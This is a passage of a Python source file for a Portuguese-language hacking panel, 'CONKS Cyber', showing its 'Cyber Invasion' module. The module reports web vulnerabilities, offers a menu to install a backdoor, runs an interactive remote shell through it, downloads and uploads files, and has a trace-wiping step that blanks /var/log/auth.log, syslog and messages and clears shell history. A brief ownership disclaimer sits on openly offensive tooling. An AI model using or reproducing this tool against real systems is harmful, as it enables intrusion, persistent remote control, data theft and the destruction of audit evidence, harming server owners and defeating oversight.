                data=data,
                headers={
                    "User-Agent": "Mozilla/5.0",
                    "Content-Type": "application/x-www-form-urlencoded"
                }
            )
            response = urllib.request.urlopen(req, timeout=10)
            
            print(f"{GREEN}[+] Enviado: {remoto}{RESET}")
            return True
        except Exception as e:
            print(f"{RED}[-] Erro: {str(e)}{RESET}")
            return False
    
    # ==========================================
    # 15. TERMINAL INTERATIVO
    # ==========================================
    
    def terminal_interativo(self):
        """Terminal interativo completo"""
        if not self.backdoor_instalado:
            print(f"\n{RED}[!] Backdoor nao instalado!{RESET}")
            return
        
        print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
        print(f"{PURPLE}║     ⚡ TERMINAL INTERATIVO        ║{RESET}")
        print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
        print(f"{PURPLE}║ Alvo: {self.target}:{self.port}{' ' * (23 - len(str(self.port))) }║{RESET}")
        print(f"{PURPLE}║ Comandos: whoami, ls, pwd, cat   ║{RESET}")
        print(f"{PURPLE}║          download, upload, clean ║{RESET}")
        print(f"{PURPLE}║ Digite 'exit' para sair          ║{RESET}")
        print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
        
        while True:
            comando = input(f"\n{RED}shell@{self.target}>{RESET} ").strip()
            
            if not comando:
                continue
            
            if comando.lower() in ['exit', 'quit', 'sair']:
                print(f"{YELLOW}[!] Terminal encerrado{RESET}")
                break
            
            if comando.lower().startswith('download '):
                arquivo = comando[9:].strip()
                self.baixar_arquivo(arquivo)
                continue
            
            if comando.lower().startswith('upload '):
                partes = comando[7:].strip().split()
                if len(partes) >= 2:
                    self.enviar_arquivo(partes[0], partes[1])
                continue
            
            resultado = self.executar_comando(comando)
            print(f"{WHITE}{resultado}{RESET}")
    
    # ==========================================
    # 16. MOSTRA RESULTADOS COMPLETOS
    # ==========================================
    
    def mostrar_resultados(self):
        """Mostra todos os resultados encontrados"""
        print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
        print(f"{PURPLE}║     📊 RELATORIO COMPLETO        ║{RESET}")
        print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
        print(f"{PURPLE}║ Alvo: {self.target}:{self.port}{' ' * (25 - len(str(self.port))) }║{RESET}")
        print(f"{PURPLE}║ Data: {datetime.datetime.now().strftime('%d/%m/%Y %H:%M')}{' ' * (18) }║{RESET}")
        print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
        
        # ==========================================
        # PORTAS ABERTAS
        # ==========================================
        if self.portas_abertas:
            print(f"\n{CYAN}┌─ PORTAS ABERTAS ({len(self.portas_abertas)}){RESET}")
            for porta in self.portas_abertas:
                print(f"  {GREEN}[+] {porta['porta']} - {porta['servico']}{RESET}")
        
        # ==========================================
        # SUBDOMÍNIOS
        # ==========================================
        if self.subdominios:
            print(f"\n{CYAN}┌─ SUBDOMÍNIOS ({len(self.subdominios)}){RESET}")
            for sub in self.subdominios[:10]:
                print(f"  {GREEN}[+] {sub['subdominio']} -> {sub['ip']}{RESET}")
        
        # ==========================================
        # DIRETÓRIOS
        # ==========================================
        if self.diretorios:
            print(f"\n{CYAN}┌─ DIRETÓRIOS ({len(self.diretorios)}){RESET}")
            for diretorio in self.diretorios[:10]:
                print(f"  {GREEN}[+] {diretorio}{RESET}")
        
        # ==========================================
        # VULNERABILIDADES
        # ==========================================
        print(f"\n{CYAN}┌─ VULNERABILIDADES ENCONTRADAS{RESET}")
        
        # SQL Injection
        if self.vulnerabilidades.get('sql_injection'):
            print(f"  {RED}🔥 SQL Injection: {len(self.vulnerabilidades['sql_injection'])} encontradas{RESET}")
            for vuln in self.vulnerabilidades['sql_injection'][:5]:
                print(f"     {vuln['endpoint']} -> {vuln['payload']}")
        
        # XSS
        if self.vulnerabilidades.get('xss'):
            print(f"  {RED}🔥 XSS: {len(self.vulnerabilidades['xss'])} encontrados{RESET}")
            for vuln in self.vulnerabilidades['xss'][:5]:
                print(f"     {vuln['endpoint']} -> {vuln['payload'][:30]}...")
        
        # LFI
        if self.vulnerabilidades.get('lfi'):
            print(f"  {RED}🔥 LFI: {len(self.vulnerabilidades['lfi'])} encontrados{RESET}")
            for vuln in self.vulnerabilidades['lfi'][:5]:
                print(f"     {vuln['endpoint']} -> {vuln['payload']}")
        
        # RFI
        if self.vulnerabilidades.get('rfi'):
            print(f"  {RED}🔥 RFI: {len(self.vulnerabilidades['rfi'])} encontrados{RESET}")
            for vuln in self.vulnerabilidades['rfi'][:5]:
                print(f"     {vuln['endpoint']} -> {vuln['payload']}")
        
        # Upload
        if self.vulnerabilidades.get('upload'):
            print(f"  {RED}🔥 Upload Vulneravel: {len(self.vulnerabilidades['upload'])} encontrados{RESET}")
            for upload in self.vulnerabilidades['upload'][:5]:
                print(f"     {upload}")
        
        # ==========================================
        # USUÁRIOS
        # ==========================================
        if self.usuarios:
            print(f"\n{CYAN}┌─ USUÁRIOS DO SISTEMA ({len(self.usuarios)}){RESET}")
            for user in self.usuarios[:10]:
                print(f"  {GREEN}[+] {user}{RESET}")
        
        # ==========================================
        # BACKDOOR
        # ==========================================
        if self.backdoor_instalado:
            print(f"\n{CYAN}┌─ BACKDOOR INSTALADO{RESET}")
            print(f"  {GREEN}[+] URL: {self.backdoor_url}{RESET}")
            print(f"  {GREEN}[+] Exemplo: {self.backdoor_url}?cmd=whoami{RESET}")
        else:
            print(f"\n{CYAN}┌─ BACKDOOR{RESET}")
            print(f"  {YELLOW}[!] Backdoor nao instalado{RESET}")
            print(f"  {YELLOW}[!] Use a opcao [1] para instalar{RESET}")
        
        print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
        print(f"{PURPLE}║     ✅ SCAN ULTIMATE CONCLUIDO!   ║{RESET}")
        print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")


# ==========================================
# ⭐ CYBER INVASION - FUNÇÃO PRINCIPAL ⭐
# ==========================================

def cyber_invasion():
    """Cyber Invasion ULTIMATE"""
    
    limpar_tela()
    
    print("\n╔══════════════════════════════════════════╗")
    print("║    🚀 CYBER INVASION ULTIMATE         ║")
    print("╠══════════════════════════════════════════╣")
    print("║  SCAN COMPLETO EM TODOS OS ASPECTOS    ║")
    print("║  ENCONTRA TODAS AS VULNERABILIDADES   ║")
    print("║  APENAS EM SERVIDORES PROPIOS!        ║")
    print("╚══════════════════════════════════════════╝")
    
    print("\n[~] Digite o alvo:")
    print("[1] IP Local (127.0.0.1)")
    print("[2] Site/Dominio")
    print("[3] Voltar")
    
    opcao = input("\nEscolha: ").strip()
    
    if opcao == "3":
        return
    
    if opcao == "1":
        alvo = input("\nIP: ").strip()
        if alvo == "":
            alvo = "127.0.0.1"
    elif opcao == "2":
        alvo = input("\nSite: ").strip()
        alvo = alvo.replace("http://", "").replace("https://", "").split("/")[0]
    else:
        print("[-] Opcao invalida.")
        input("\nENTER para continuar...")
        return
    
    if not alvo:
        print("[-] Alvo invalido.")
        input("\nENTER para continuar...")
        return
    
    try:
        porta = int(input("\nPorta (80): ").strip() or "80")
    except:
        porta = 80
    
    # AVISO LEGAL
    print(f"\n{RED}{BOLD}╔══════════════════════════════════════════╗{RESET}")
    print(f"{RED}{BOLD}║        ⚠️  AVISO LEGAL                 ║{RESET}")
    print(f"{RED}{BOLD}╠══════════════════════════════════════════╣{RESET}")
    print(f"{RED}║  • Voce esta invadindo {alvo}        ║{RESET}")
    print(f"{RED}║  • So e permitido em servidores       ║{RESET}")
    print(f"{RED}║    que voce POSSUI!                   ║{RESET}")
    print(f"{RED}║  • Invadir outros e CRIME!            ║{RESET}")
    print(f"{RED}{BOLD}╚══════════════════════════════════════════╝{RESET}")
    
    confirm = input(f"\n{RED}Confirma que {alvo} e seu? (s/N): {RESET}").strip().lower()
    
    if confirm != 's':
        print("[-] Cancelado.")
        input("\nENTER para continuar...")
        return
    
    # INICIA INVASAO
    invasor = CyberInvasionUltimate(alvo, porta)
    
    # SCAN COMPLETO
    invasor.scan_completo()
    
    # MOSTRA RESULTADOS
    invasor.mostrar_resultados()
    
    # ==========================================
    # MENU DE OPCOES POS-INVASAO
    # ==========================================
    
    while True:
        print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
        print(f"{PURPLE}║    🎯 MENU DE CONTROLE           ║{RESET}")
        print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
        
        if invasor.backdoor_instalado:
            print(f"{GREEN}║ ✅ Backdoor: INSTALADO           ║{RESET}")
            print(f"{GREEN}║ 📍 {invasor.backdoor_url[:35]}{' ' * (10) }║{RESET}")
        else:
            print(f"{RED}║ ❌ Backdoor: NAO INSTALADO       ║{RESET}")
        
        print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
        print(f"{PURPLE}║ [1] Instalar Backdoor            ║{RESET}")
        print(f"{PURPLE}║ [2] Terminal Interativo          ║{RESET}")
        print(f"{PURPLE}║ [3] Executar Comando             ║{RESET}")
        print(f"{PURPLE}║ [4] Baixar Arquivo               ║{RESET}")
        print(f"{PURPLE}║ [5] Enviar Arquivo               ║{RESET}")
        print(f"{PURPLE}║ [6] Info do Servidor             ║{RESET}")
        print(f"{PURPLE}║ [7] Limpar Rastros               ║{RESET}")
        print(f"{PURPLE}║ [8] Sair                         ║{RESET}")
        print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
        
        sub_opcao = input(f"\n{RED}cyber@{alvo}>{RESET} ").strip()
        
        if sub_opcao == "1":
            invasor.instalar_backdoor()
            if invasor.backdoor_instalado:
                print(f"\n{GREEN}[+] Backdoor instalado com sucesso!{RESET}")
                print(f"{GREEN}[+] URL: {invasor.backdoor_url}{RESET}")
            else:
                print(f"\n{RED}[-] Falha ao instalar backdoor{RESET}")
            input("\nENTER para continuar...")
        
        elif sub_opcao == "2":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale o backdoor primeiro (opcao 1)!{RESET}")
                input("\nENTER para continuar...")
                continue
            invasor.terminal_interativo()
            input("\nENTER para continuar...")
        
        elif sub_opcao == "3":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale o backdoor primeiro (opcao 1)!{RESET}")
                input("\nENTER para continuar...")
                continue
            
            comando = input(f"{GRAY}comando> {RESET}")
            if comando:
                resultado = invasor.executar_comando(comando)
                print(f"{WHITE}{resultado}{RESET}")
            input("\nENTER para continuar...")
        
        elif sub_opcao == "4":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale o backdoor primeiro (opcao 1)!{RESET}")
                input("\nENTER para continuar...")
                continue
            
            arquivo = input(f"{GRAY}arquivo> {RESET}")
            if arquivo:
                invasor.baixar_arquivo(arquivo)
            input("\nENTER para continuar...")
        
        elif sub_opcao == "5":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale o backdoor primeiro (opcao 1)!{RESET}")
                input("\nENTER para continuar...")
                continue
            
            local = input(f"{GRAY}local> {RESET}")
            remoto = input(f"{GRAY}remoto> {RESET}")
            if local and remoto:
                invasor.enviar_arquivo(local, remoto)
            input("\nENTER para continuar...")
        
        elif sub_opcao == "6":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale o backdoor primeiro (opcao 1)!{RESET}")
                input("\nENTER para continuar...")
                continue
            
            print(f"{GREEN}[+] Info do servidor:{RESET}")
            resultado = invasor.executar_comando("uname -a && echo '' && whoami && echo '' && pwd && echo '' && hostname")
            print(f"{WHITE}{resultado}{RESET}")
            input("\nENTER para continuar...")
        
        elif sub_opcao == "7":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale o backdoor primeiro (opcao 1)!{RESET}")
                input("\nENTER para continuar...")
                continue
            
            print(f"{GREEN}[+] Limpando logs...{RESET}")
            invasor.executar_comando("echo '' > /var/log/auth.log && echo '' > /var/log/syslog && echo '' > /var/log/messages && history -c")
            print(f"{GREEN}[+] Logs limpos!{RESET}")
            input("\nENTER para continuar...")
        
        elif sub_opcao == "8":
            print(f"\n{YELLOW}[!] Encerrando Cyber Invasion...{RESET}")
            break
        
        else:
            print("[-] Opcao invalida")
            input("\nENTER para continuar...")


# ==========================================
# MENU PRINCIPAL
# ==========================================

def menu_principal():
    while True:
        limpar_tela()
        banner()
        
        topo_caixa("MENU PRINCIPAL")
        linha_caixa("[1] Geradores")
        linha_caixa("[2] Consultas")
        linha_caixa("[3] OSINT")
        linha_caixa("[4] Rede")
        linha_caixa("[5] Validadores")
        linha_caixa("[6] Utilidades")
        linha_caixa("[7] ⚡ Shoot Down", RED, True)
        linha_caixa("[8] 🚀 Cyber Invasion", PURPLE, True)
        linha_caixa("[9] Atualizar", BLUE, True)
        linha_caixa("")
        linha_caixa("[0] Sair", RED, True)
        fim_caixa()
        
        opcao = input(f"\n{BLUE}{BOLD}CONKS@Cyber > {RESET}").strip()
        
        if opcao == "1":
            limpar_tela()
            menu_geradores()
        elif opcao == "2":
            limpar_tela()
            menu_consultas()
        elif opcao == "3":
            limpar_tela()
            menu_osint()
        elif opcao == "4":
            menu_rede()
        elif opcao == "5":
            limpar_tela()
            try:
                from modules.validators import menu_validadores
                menu_validadores()
            except ImportError:
                erro("Modulo nao encontrado.")
                input("\nENTER para continuar...")
        elif opcao == "6":
            limpar_tela()
            try:
                from modules.utilities import menu_utilidades
                menu_utilidades()
            except ImportError:
                erro("Modulo nao encontrado.")
                input("\nENTER para continuar...")
        elif opcao == "7":
            limpar_tela()
            try:
                from modules.consultas import derrubar_geral
                derrubar_geral()
            except ImportError:
                erro("Shoot Down nao encontrado.")
                input("\nENTER para continuar...")
        elif opcao == "8":
            cyber_invasion()
        elif opcao == "9":
            atualizar_painel()
        elif opcao == "0":
            limpar_tela()
            print()
            print(f"{RED}{BOLD}╔{'═' * (LARGURA - 2)}╗{RESET}")
            linha_caixa("CONKS CYBER ENCERRADO", RED, True)
            print(f"{RED}{BOLD}╚{'═' * (LARGURA - 2)}╝{RESET}\n")
            sys.exit(0)
        else:
            erro("Opcao invalida.")
            input("\nENTER para continuar...")


# ==========================================
# MAIN
# ==========================================

def main():
    try:
        menu_principal()
    except KeyboardInterrupt:
        limpar_tela()
        print(f"\n{RED}{BOLD}[!] CONKS Cyber encerrado.{RESET}\n")
    except Exception as erro_inesperado:
        print(f"\n{RED}[ERRO] {erro_inesperado}{RESET}")
        input("\nENTER para sair...")


if __name__ == "__main__":
    main()